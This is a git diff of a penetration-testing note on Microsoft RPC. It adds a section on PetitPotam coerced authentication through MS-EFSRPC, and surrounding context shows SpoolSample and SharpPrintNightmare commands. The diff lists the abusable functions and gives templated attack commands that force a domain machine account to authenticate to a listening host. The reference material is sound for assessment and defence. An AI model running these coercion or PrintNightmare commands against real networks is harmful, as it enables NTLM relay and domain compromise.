@@ -7,12 +7,12 @@ proprietary version of the `Remote Procedure Call (RPC)`. Similarly to the
 `RPC` protocol, the `MSRPC` protocol implements a client-server model, in order
 to allow one program, the `RCP` client, to interact with another program, the
 `RPC` server, alternatively denominated service. The client and server may be
-running on the same system or on two distinct and remote systems.    
+running on the same system or on two distinct and remote systems.
 
 Among others, the proprietary Microsoft `Distributed Component Object Model
 (DCOM)` technology, used for communication between Microsoft software
 components - `Component Object Model (COM)` objects - on networked computers,
-extensively uses the `MSRPC` protocol as the underlying communication protocol.  
+extensively uses the `MSRPC` protocol as the underlying communication protocol.
 
 `RPC` services listen for remote procedure call requests over one, or more,
 protocol-specific `endpoints`, which can either be:
@@ -32,7 +32,7 @@ a network layer protocol, and a transport layer protocol:
   - `ncacn_np`: `RPC` over `SMB` named pipes (usually on `TCP` ports 139 or
     445)
   - `ncacn_http`: `RCP` over the `HTTP` protocol
-  - `ncacn_nb_tcp` : `RPC` over `NetBIOS` (usually on `TCP` port 135)  
+  - `ncacn_nb_tcp` : `RPC` over `NetBIOS` (usually on `TCP` port 135)
   - [...]
 
 Based on the `RPC protocol sequence`, a `RPC` endpoint may take the following
@@ -61,7 +61,7 @@ Mapper` service to tell them which dynamic port, or ports, were assigned to the
 requested RPC service. The `RPC Endpoint Mapper` service, running on `RPC`
 servers as `NT AUTHORITY\NetworkService`, is accessible as an RPC service at
 the following `well-known endpoints`:
-  - `ncacn_ip_tcp:<IP | HOSTNAME>[135]` / `ncacn_ip_udp:<IP | HOSTNAME>[135]`  
+  - `ncacn_ip_tcp:<IP | HOSTNAME>[135]` / `ncacn_ip_udp:<IP | HOSTNAME>[135]`
   - `ncacn_np:<IP | HOSTNAME>[\pipe\epmapper]` (`TCP` ports 139 or 445)
   - `ncacn_http:<IP | HOSTNAME>[593]`
 
@@ -79,7 +79,7 @@ installed services.
 | `12345778-1234-ABCD-EF00-0123456789AB` | `LSARPC` | The `Local Security Authority (LSA)` interface, used to manage various machine and domain security policies, such as the rights and privileges that security principals have on the machine as well as the trust relationships between domains and forests. |
 | `3919286A-B10C-11D0-9BA8-00C04FD92EF5` | `LSARPC-DS` | The `LSA` `Directory Services Setup (DS)` interface, that exposes domain-related computer state and basic domain configuration information |
 | `12345678-1234-ABCD-EF00-0123456789AB` | `MS-RPRN` | The `Print System Remote Protocol` interface, which defines the communication of print job processing and print system management between a print client and a print server. Can be leveraged by any authenticated user to force the machine exposing the interface to connect, with its machine account, to a remote system. |
-| `1FF70682-0A51-30E8-076D-740BE8CEE98B`<br/>`378E52B0-C0A9-11CF-822D-00AA0051E40F`<br/>`86D35949-83C9-4044-B424-DB363231FD0C` | `ATSVC` | The `Task Scheduler` interface, that exposes scheduled tasks related functions. May be used to list existing tasks, query a configured task status, and configure or register tasks. |   
+| `1FF70682-0A51-30E8-076D-740BE8CEE98B`<br/>`378E52B0-C0A9-11CF-822D-00AA0051E40F`<br/>`86D35949-83C9-4044-B424-DB363231FD0C` | `ATSVC` | The `Task Scheduler` interface, that exposes scheduled tasks related functions. May be used to list existing tasks, query a configured task status, and configure or register tasks. |
 | `367ABB81-9844-35F1-AD32-98F038001003` | `SVCCTL` | The `Service Control Manager (SCM)` interface, that enables remote configuration and control of Windows services. |
 | `4B324FC8-1670-01D3-1278-5A47BF6EE188` | `SRVSVC` | The `Server Service` interface, used for network shares related operations on the machine. |
 | `338CD001-2244-31F1-AAAA-900038001003` | `MSWINREG` | The `Windows Remote Registry` interface, used for remotely managing the Windows registry. |
@@ -226,7 +226,7 @@ Additionally, the (outdated) `enum4linux` Perl and (maintained)
 through `MSRPC` calls and `NetBIOS` and `LDAP` queries (for Domain
 Controllers). `enum4linux-ng.py` will notably attempt to enumerate users,
 groups, group's memberships, password policy information, shares, and, against
-Domain Controllers, naming context information.   
+Domain Controllers, naming context information.
 
 ```
 # -A: all simple enumeration including nmblookup (-U -G -S -P -O -N -I -L).
@@ -326,7 +326,7 @@ callback.
 
 ```
 # In order to trigger a Kerberos authentication, the listening host <LHOST_HOSTNAME> should be associated to a Service Principal Names (SPN) in the domain and a valid DNS record
-# For more information, refer to the `[ActiveDirectory] Kerberos unconstrained delegation` note   
+# For more information, refer to the `[ActiveDirectory] Kerberos unconstrained delegation` note
 
 SpoolSample.exe <TARGET_IP | TARGET_HOSTNAME> <LHOST_HOSTNAME>
 
@@ -426,30 +426,100 @@ SharpPrintNightmare.exe '\\<IP>\<SHARE_NAME>>\<DLL>' '\\<TARGET_HOSTNAME | TARGE
 SharpPrintNightmare.exe '\\<IP>\<SHARE_NAME>>\<DLL>' '\\<TARGET_HOSTNAME | TARGET_IP>' <DOMAIN | WORKGROUP> <USERNAME> <PASSWORD>
 ```
 
+### MS-EFSRPC (Encrypting File System Remote (EFSRPC) Protocol - PetitPotam
+
+Similarly to functions exposed by the `MS-RPRN` `MSRPC` interface, a number
+of functions of the `MS-EFSRPC` `MSRPC` interface can be abused to coerce hosts
+to authenticate to an arbitrary (and possibly controlled) machine. The binding
+to the `MS-EFSRPC` `MSRPC` interface can be done over the `EFSRPC` named pipe
+(`\PIPE\efsrpc`) as well as a number of other named pipes (`LSARPC` /
+`\PIPE\lsarpc`, `MS-NRPC` / `\PIPE\netlogon`, `MS-SAMR` / `\PIPE\samr`, and
+`\PIPE\lsass`). The binding and calling of `MS-EFSRPC` functions can be done
+with out authentication against unpatched Domain Controllers.
+
+The coerced authentication will be done by the machine account of the targeted
+machine, and thus the exploit primitives detailed in the
+`MS-RPRN "printer bug"` section above apply. For more information on relaying
+`NTLM` authentication, refer to the `[ActiveDirectory] NTLM capture and relay`
+note.
+
+The following functions are implemented in the
+[`PetitPotam`](https://github.com/topotam/PetitPotam) exploit to coerce
+authentications:
+  - `EfsRpcOpenFileRaw` (patch to prevent coerced authentication available)
+  - `EfsRpcEncryptFileSrv`
+  - `EfsRpcDecryptFileSrv`
+  - `EfsRpcQueryUsersOnFile`
+  - `EfsRpcQueryRecoveryAgents`
+  - `EfsRpcRemoveUsersFromFile`
+  - `EfsRpcAddUsersToFile`
+  - `EfsRpcFileKeyInfo`
+  - `EfsRpcDuplicateEncryptionInfoFile`
+  - `EfsRpcAddUsersToFileEx`
+  - `EfsRpcFileKeyInfoEx`
+  - `EfsRpcGetEncryptedFileMetadata`
+  - `EfsRpcSetEncryptedFileMetadata`
+  - `EfsRpcEncryptFileExSrv`
+
+```bash
+# Attempt with out authentication.
+PetitPotam.py <LISTENING_HOST> <TARGETED_HOST>
+
+# Authenticated attempt, using username:password, username:NTHash, or Kerberos authentication.
+PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' [-p '<PASSWORD>' | -hashes '<[LMHASH]:NTHASH>'] <LISTENING_HOST> <TARGETED_HOST>
+PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -k -no-pass <LISTENING_HOST> <TARGETED_HOST>
+
+# Specify the named pipe to use for binding. Defaults to lsarpc.
+PetitPotam.py -pipe <efsr | lsarpc | samr | netlogon | lsass> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <LISTENING_HOST> <TARGETED_HOST>
+```
+
 --------------------------------------------------------------------------------
 
 ### References
 
 https://pubs.opengroup.org/onlinepubs/9629399/chap2.htm
+
+
 Network Security Assessment: Know Your Network
+
 https://publications.opengroup.org/c706
+
 https://book.hacktricks.xyz/pentesting/135-penstesting-wrpc
+
 https://actes.sstic.org/SSTIC06/Dissection_RPC_Windows/SSTIC06-article-Pouvesle-Dissection_RPC_Windows.pdf
+
 http://etutorials.org/Networking/network+security+assessment/Chapter+9.+Assessing+Windows+Networking+Services/9.2+Microsoft+RPC+Services/
+
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/cca27429-5689-4a16-b2b4-9325d93e4ba2
+
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15
+
 https://tools.ietf.org/html/rfc1831
+
 https://redmondmag.com/articles/2004/02/01/the-magic-of-rpc-over-http.aspx
+
 https://www.windows-security.org/windows-service/rpc-endpoint-mapper
+
 https://support.microsoft.com/en-us/help/832017/service-overview-and-network-port-requirements-for-windows
+
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/96952411-1d17-4fe4-879c-d5b48a264314
+
 https://kb.juniper.net/InfoCenter/index?page=content&id=KB12057&pmv=print&actp=&searchid=&type=currentpaging
+
 https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+
 https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
+
 https://beta.hackndo.com/constrained-unconstrained-delegation/
+
 https://docs.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol?redirectedfrom=MSDN
+
 https://github.com/afwu/PrintNightmare
+
 https://github.com/cube0x0/CVE-2021-1675
+
 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2
+
 https://securelist.com/quick-look-at-cve-2021-1675-cve-2021-34527-aka-printnightmare/103123/
+
 https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/
